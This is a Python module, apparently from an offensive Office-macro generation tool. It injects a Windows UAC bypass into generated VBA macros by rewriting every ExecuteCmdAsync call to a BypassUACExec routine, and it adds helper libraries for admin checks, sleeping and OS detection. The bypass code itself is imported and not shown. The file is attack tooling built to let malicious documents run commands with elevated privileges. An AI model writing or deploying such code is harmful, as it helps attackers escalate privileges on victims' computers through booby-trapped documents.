#!/usr/bin/env python
# encoding: utf-8

from modules.mp_module import MpModule
import vbLib.UACBypassExecuteCMDAsync
import vbLib.IsAdmin
import vbLib.Sleep
import vbLib.GetOSVersion
import logging



class UACBypass(MpModule):        


    
    def run(self):
        logging.info(" [+] Insert UAC Bypass routine ...")
        # Browse all vba modules and replace ExecuteCmdAsync by ExecUAC
        for vbaFile in self.getVBAFiles():
            with open(vbaFile) as f:
                content = f.readlines()
            for n,line in enumerate(content):
                if "ExecuteCmdAsync" in line and "Sub ExecuteCmdAsync" not in line:
                    content[n] = line.replace("ExecuteCmdAsync","BypassUACExec")

            with open(vbaFile, 'w') as f:
                f.writelines(content)
        self.addVBLib(vbLib.UACBypassExecuteCMDAsync)
        self.addVBLib(vbLib.IsAdmin)
        self.addVBLib(vbLib.Sleep)
        self.addVBLib(vbLib.GetOSVersion)

        logging.info("   [-] OK!") 
        